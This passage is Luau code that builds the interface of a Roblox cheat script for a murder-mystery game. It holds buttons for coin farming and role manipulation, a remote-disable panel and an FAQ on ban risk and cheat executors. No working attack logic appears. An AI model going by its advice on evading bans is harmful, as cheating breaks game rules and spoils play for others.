G2L["182"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.coinsfarm
G2L["183"] = Instance.new("TextButton", G2L["170"]);
G2L["183"]["TextWrapped"] = true;
G2L["183"]["TextStrokeTransparency"] = 0;
G2L["183"]["BorderSizePixel"] = 0;
G2L["183"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["183"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["183"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["183"]["TextSize"] = 20;
G2L["183"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["183"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["183"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["183"]["Name"] = [[coinsfarm]];
G2L["183"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["183"]["Text"] = [[Coins-Farm [WIP]  ]];
G2L["183"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.coinsfarm.Frame
G2L["184"] = Instance.new("Frame", G2L["183"]);
G2L["184"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["184"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["184"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["184"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.coinsfarm.UIGradient
G2L["185"] = Instance.new("UIGradient", G2L["183"]);
G2L["185"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.FastSeparator
G2L["186"] = Instance.new("TextLabel", G2L["170"]);
G2L["186"]["TextWrapped"] = true;
G2L["186"]["BorderSizePixel"] = 0;
G2L["186"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["186"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["186"]["TextSize"] = 16;
G2L["186"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["186"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["186"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["186"]["Text"] = [[- - -  ]];
G2L["186"]["Name"] = [[FastSeparator]];
G2L["186"]["BackgroundTransparency"] = 1;
G2L["186"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.notifywhenyourfriendiskilled
G2L["187"] = Instance.new("TextButton", G2L["170"]);
G2L["187"]["TextWrapped"] = true;
G2L["187"]["TextStrokeTransparency"] = 0;
G2L["187"]["BorderSizePixel"] = 0;
G2L["187"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["187"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["187"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["187"]["TextSize"] = 18;
G2L["187"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["187"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["187"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["187"]["Name"] = [[notifywhenyourfriendiskilled]];
G2L["187"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["187"]["Text"] = [[Notify When Your Friend Is Killed  ]];
G2L["187"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.notifywhenyourfriendiskilled.Frame
G2L["188"] = Instance.new("Frame", G2L["187"]);
G2L["188"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["188"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["188"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["188"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.notifywhenyourfriendiskilled.UIGradient
G2L["189"] = Instance.new("UIGradient", G2L["187"]);
G2L["189"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.notifywhensherrifiskilled
G2L["18a"] = Instance.new("TextButton", G2L["170"]);
G2L["18a"]["TextWrapped"] = true;
G2L["18a"]["TextStrokeTransparency"] = 0;
G2L["18a"]["BorderSizePixel"] = 0;
G2L["18a"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18a"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["18a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18a"]["TextSize"] = 20;
G2L["18a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["18a"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["18a"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["18a"]["Name"] = [[notifywhensherrifiskilled]];
G2L["18a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18a"]["Text"] = [[Notify When Sheriff Is Killed  ]];
G2L["18a"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.notifywhensherrifiskilled.Frame
G2L["18b"] = Instance.new("Frame", G2L["18a"]);
G2L["18b"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["18b"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["18b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18b"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.notifywhensherrifiskilled.UIGradient
G2L["18c"] = Instance.new("UIGradient", G2L["18a"]);
G2L["18c"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.notifywhenaplayeriskilled
G2L["18d"] = Instance.new("TextButton", G2L["170"]);
G2L["18d"]["TextWrapped"] = true;
G2L["18d"]["TextStrokeTransparency"] = 0;
G2L["18d"]["BorderSizePixel"] = 0;
G2L["18d"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18d"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["18d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18d"]["TextSize"] = 20;
G2L["18d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["18d"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["18d"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["18d"]["Name"] = [[notifywhenaplayeriskilled]];
G2L["18d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18d"]["Text"] = [[Notify When A Player Is Killed  ]];
G2L["18d"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.notifywhenaplayeriskilled.Frame
G2L["18e"] = Instance.new("Frame", G2L["18d"]);
G2L["18e"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["18e"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["18e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18e"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.notifywhenaplayeriskilled.UIGradient
G2L["18f"] = Instance.new("UIGradient", G2L["18d"]);
G2L["18f"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.HandlerV5
G2L["190"] = Instance.new("LocalScript", G2L["170"]);
G2L["190"]["Name"] = [[HandlerV5]];

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.FastSeparator
G2L["191"] = Instance.new("TextLabel", G2L["170"]);
G2L["191"]["TextWrapped"] = true;
G2L["191"]["BorderSizePixel"] = 0;
G2L["191"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["191"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["191"]["TextSize"] = 16;
G2L["191"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["191"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["191"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["191"]["Text"] = [[- - -  ]];
G2L["191"]["Name"] = [[FastSeparator]];
G2L["191"]["BackgroundTransparency"] = 1;
G2L["191"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.trytobesheriff
G2L["192"] = Instance.new("TextButton", G2L["170"]);
G2L["192"]["TextWrapped"] = true;
G2L["192"]["TextStrokeTransparency"] = 0;
G2L["192"]["BorderSizePixel"] = 0;
G2L["192"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["192"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["192"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["192"]["TextSize"] = 18;
G2L["192"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["192"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["192"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["192"]["Name"] = [[trytobesheriff]];
G2L["192"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["192"]["Text"] = [[Try To Be Sheriff in every Round  ]];
G2L["192"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.trytobesheriff.Frame
G2L["193"] = Instance.new("Frame", G2L["192"]);
G2L["193"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["193"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["193"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["193"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.trytobesheriff.UIGradient
G2L["194"] = Instance.new("UIGradient", G2L["192"]);
G2L["194"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.TryToDodgeMurderer
G2L["195"] = Instance.new("TextButton", G2L["170"]);
G2L["195"]["TextWrapped"] = true;
G2L["195"]["TextStrokeTransparency"] = 0;
G2L["195"]["BorderSizePixel"] = 0;
G2L["195"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["195"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["195"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["195"]["TextSize"] = 18;
G2L["195"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["195"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["195"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["195"]["Name"] = [[TryToDodgeMurderer]];
G2L["195"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["195"]["Text"] = [[Try to dodge the Murderer  ]];
G2L["195"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.7324561476707458, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.TryToDodgeMurderer.Frame
G2L["196"] = Instance.new("Frame", G2L["195"]);
G2L["196"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["196"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["196"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["196"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.TryToDodgeMurderer.UIGradient
G2L["197"] = Instance.new("UIGradient", G2L["195"]);
G2L["197"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.LockScript
G2L["198"] = Instance.new("Frame", G2L["a"]);
G2L["198"]["ZIndex"] = 55;
G2L["198"]["BorderSizePixel"] = 0;
G2L["198"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["198"]["BackgroundTransparency"] = 0.4000000059604645;
G2L["198"]["Size"] = UDim2.new(1.0055201053619385, -2, 1.13614821434021, -32);
G2L["198"]["ClipsDescendants"] = true;
G2L["198"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["198"]["Position"] = UDim2.new(-0.001362187904305756, 0, 0, 0);
G2L["198"]["Visible"] = false;
G2L["198"]["Name"] = [[LockScript]];
-- Attributes
G2L["198"]:SetAttribute([[SYSTEM_MESSAGE]], [[]]);
G2L["198"]:SetAttribute([[ERROR]], false);
G2L["198"]:SetAttribute([[BAN]], false);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.LockScript.TextLabel
G2L["199"] = Instance.new("TextLabel", G2L["198"]);
G2L["199"]["TextWrapped"] = true;
G2L["199"]["TextScaled"] = true;
G2L["199"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["199"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["199"]["TextSize"] = 20;
G2L["199"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["199"]["Size"] = UDim2.new(0, 421, 0, 63);
G2L["199"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["199"]["Text"] = [[This script has been disabled for you, the system has left a message:]];
G2L["199"]["Position"] = UDim2.new(0.0498281791806221, 0, 0.043859440833330154, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.LockScript.TextBox
G2L["19a"] = Instance.new("TextBox", G2L["198"]);
G2L["19a"]["TextSize"] = 20;
G2L["19a"]["TextWrapped"] = true;
G2L["19a"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["19a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["19a"]["MultiLine"] = true;
G2L["19a"]["PlaceholderText"] = [[enter system message here...]];
G2L["19a"]["Size"] = UDim2.new(0, 421, 0, 126);
G2L["19a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19a"]["Text"] = [[]];
G2L["19a"]["Position"] = UDim2.new(0.0498281791806221, 0, 0.3684210777282715, 0);
G2L["19a"]["ClearTextOnFocus"] = false;

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FAQ
G2L["19b"] = Instance.new("ScrollingFrame", G2L["a"]);
G2L["19b"]["Active"] = true;
G2L["19b"]["BorderSizePixel"] = 0;
G2L["19b"]["CanvasSize"] = UDim2.new(0, 0, 0, 1135);
G2L["19b"]["TopImage"] = [[]];
G2L["19b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19b"]["BackgroundTransparency"] = 0.9599999785423279;
G2L["19b"]["Size"] = UDim2.new(0, 367, 0, 228);
G2L["19b"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19b"]["Position"] = UDim2.new(0, 0, -6.667785612535226e-08, 0);
G2L["19b"]["Visible"] = false;
G2L["19b"]["Name"] = [[ALT_page_FAQ]];
G2L["19b"]["BottomImage"] = [[]];

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FAQ.UIListLayout
G2L["19c"] = Instance.new("UIListLayout", G2L["19b"]);
G2L["19c"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["19c"]["Padding"] = UDim.new(0, 5);
G2L["19c"]["SortOrder"] = Enum.SortOrder.LayoutOrder;

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FAQ.Separator
G2L["19d"] = Instance.new("TextLabel", G2L["19b"]);
G2L["19d"]["TextWrapped"] = true;
G2L["19d"]["BorderSizePixel"] = 0;
G2L["19d"]["TextScaled"] = true;
G2L["19d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["19d"]["TextSize"] = 16;
G2L["19d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19d"]["Size"] = UDim2.new(0, 356, 0, 67);
G2L["19d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19d"]["Text"] = [[Hello, this page is text-based. You'll be able to see some frequently asked questions from the exploiting community or about this script. Greetings!]];
G2L["19d"]["Name"] = [[Separator]];
G2L["19d"]["BackgroundTransparency"] = 1;
G2L["19d"]["Position"] = UDim2.new(0.014986376278102398, 0, -6.692451393064403e-08, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FAQ.Separator
G2L["19e"] = Instance.new("TextLabel", G2L["19b"]);
G2L["19e"]["TextWrapped"] = true;
G2L["19e"]["BorderSizePixel"] = 0;
G2L["19e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["19e"]["TextSize"] = 16;
G2L["19e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19e"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["19e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19e"]["Text"] = [[- - - - - - - - - -  - - - - - - - - - -  - - - - - - - - - -  ]];
G2L["19e"]["Name"] = [[Separator]];
G2L["19e"]["BackgroundTransparency"] = 1;
G2L["19e"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FAQ.Separator
G2L["19f"] = Instance.new("TextLabel", G2L["19b"]);
G2L["19f"]["TextWrapped"] = true;
G2L["19f"]["BorderSizePixel"] = 0;
G2L["19f"]["TextScaled"] = true;
G2L["19f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["19f"]["TextSize"] = 16;
G2L["19f"]["TextColor3"] = Color3.fromRGB(176, 180, 255);
G2L["19f"]["Size"] = UDim2.new(0, 356, 0, 21);
G2L["19f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19f"]["Text"] = [[¿ Is this script bannable ?]];
G2L["19f"]["Name"] = [[Separator]];
G2L["19f"]["BackgroundTransparency"] = 1;
G2L["19f"]["Position"] = UDim2.new(0.014986376278102398, 0, 0.4385964274406433, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FAQ.Separator
G2L["1a0"] = Instance.new("TextLabel", G2L["19b"]);
G2L["1a0"]["TextWrapped"] = true;
G2L["1a0"]["BorderSizePixel"] = 0;
G2L["1a0"]["TextScaled"] = true;
G2L["1a0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a0"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a0"]["TextSize"] = 16;
G2L["1a0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a0"]["Size"] = UDim2.new(0, 349, 0, 68);
G2L["1a0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a0"]["Text"] = [[From my point of view, this script is not bannable, depending on the exploit you use and the way you use it, what I mean is that you should not manipulate things about the local player excessively, since the game can fail and kick you due to invalid position.]];
G2L["1a0"]["Name"] = [[Separator]];
G2L["1a0"]["BackgroundTransparency"] = 1;
G2L["1a0"]["Position"] = UDim2.new(0.024523161351680756, 0, 0.5526314973831177, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FAQ.Separator
G2L["1a1"] = Instance.new("TextLabel", G2L["19b"]);
G2L["1a1"]["TextWrapped"] = true;
G2L["1a1"]["BorderSizePixel"] = 0;
G2L["1a1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a1"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a1"]["TextSize"] = 16;
G2L["1a1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a1"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["1a1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a1"]["Text"] = [[- - - - - - - - - - ]];
G2L["1a1"]["Name"] = [[Separator]];
G2L["1a1"]["BackgroundTransparency"] = 1;
G2L["1a1"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FAQ.Separator
G2L["1a2"] = Instance.new("TextLabel", G2L["19b"]);
G2L["1a2"]["TextWrapped"] = true;
G2L["1a2"]["BorderSizePixel"] = 0;
G2L["1a2"]["TextScaled"] = true;
G2L["1a2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a2"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a2"]["TextSize"] = 16;
G2L["1a2"]["TextColor3"] = Color3.fromRGB(176, 180, 255);
G2L["1a2"]["Size"] = UDim2.new(0, 338, 0, 21);
G2L["1a2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a2"]["Text"] = [[¿ Does this script work on all executors ?]];
G2L["1a2"]["Name"] = [[Separator]];
G2L["1a2"]["BackgroundTransparency"] = 1;
G2L["1a2"]["Position"] = UDim2.new(0.014986376278102398, 0, 0.38157889246940613, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FAQ.Separator
G2L["1a3"] = Instance.new("TextLabel", G2L["19b"]);
G2L["1a3"]["TextWrapped"] = true;
G2L["1a3"]["BorderSizePixel"] = 0;
G2L["1a3"]["TextScaled"] = true;
G2L["1a3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a3"]["TextSize"] = 1;
G2L["1a3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a3"]["Size"] = UDim2.new(0, 349, 0, 68);
G2L["1a3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a3"]["Text"] = [[Not all features are guaranteed to work with every executor. It’s recommended to use a Level 7 executor for full compatibility.]];
G2L["1a3"]["Name"] = [[Separator]];
G2L["1a3"]["BackgroundTransparency"] = 1;
G2L["1a3"]["Position"] = UDim2.new(0.024523161351680756, 0, 0.5526314973831177, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FAQ.Separator
G2L["1a4"] = Instance.new("TextLabel", G2L["19b"]);
G2L["1a4"]["TextWrapped"] = true;
G2L["1a4"]["BorderSizePixel"] = 0;
G2L["1a4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a4"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a4"]["TextSize"] = 16;
G2L["1a4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a4"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["1a4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a4"]["Text"] = [[- - - - - - - - - - ]];
G2L["1a4"]["Name"] = [[Separator]];
G2L["1a4"]["BackgroundTransparency"] = 1;
G2L["1a4"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FAQ.Separator
G2L["1a5"] = Instance.new("TextLabel", G2L["19b"]);
G2L["1a5"]["TextWrapped"] = true;
G2L["1a5"]["BorderSizePixel"] = 0;
G2L["1a5"]["TextScaled"] = true;
G2L["1a5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a5"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a5"]["TextSize"] = 16;
G2L["1a5"]["TextColor3"] = Color3.fromRGB(176, 180, 255);
G2L["1a5"]["Size"] = UDim2.new(0, 338, 0, 21);
G2L["1a5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a5"]["Text"] = [[¿ Can other players see what I’m doing ?]];
G2L["1a5"]["Name"] = [[Separator]];
G2L["1a5"]["BackgroundTransparency"] = 1;
G2L["1a5"]["Position"] = UDim2.new(0.014986376278102398, 0, 0.38157889246940613, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FAQ.Separator
G2L["1a6"] = Instance.new("TextLabel", G2L["19b"]);
G2L["1a6"]["TextWrapped"] = true;
G2L["1a6"]["BorderSizePixel"] = 0;
G2L["1a6"]["TextScaled"] = true;
G2L["1a6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a6"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a6"]["TextSize"] = 1;
G2L["1a6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a6"]["Size"] = UDim2.new(0, 349, 0, 68);
G2L["1a6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a6"]["Text"] = [[It depends. Most exploits (like ESP) are client-sided, meaning only you can see or experience them. However, anything that affects other players might be visible and reportable.]];
G2L["1a6"]["Name"] = [[Separator]];
G2L["1a6"]["BackgroundTransparency"] = 1;
G2L["1a6"]["Position"] = UDim2.new(0.024523161351680756, 0, 0.5526314973831177, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FAQ.Separator
G2L["1a7"] = Instance.new("TextLabel", G2L["19b"]);
G2L["1a7"]["TextWrapped"] = true;
G2L["1a7"]["BorderSizePixel"] = 0;
G2L["1a7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a7"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a7"]["TextSize"] = 16;
G2L["1a7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a7"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["1a7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a7"]["Text"] = [[- - - - - - - - - - ]];
G2L["1a7"]["Name"] = [[Separator]];
G2L["1a7"]["BackgroundTransparency"] = 1;
G2L["1a7"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FAQ.Separator
G2L["1a8"] = Instance.new("TextLabel", G2L["19b"]);
G2L["1a8"]["TextWrapped"] = true;
G2L["1a8"]["BorderSizePixel"] = 0;
G2L["1a8"]["TextScaled"] = true;
G2L["1a8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a8"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a8"]["TextSize"] = 16;
G2L["1a8"]["TextColor3"] = Color3.fromRGB(176, 180, 255);
G2L["1a8"]["Size"] = UDim2.new(0, 338, 0, 21);
G2L["1a8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a8"]["Text"] = [[¿ Is this safe to run ?]];
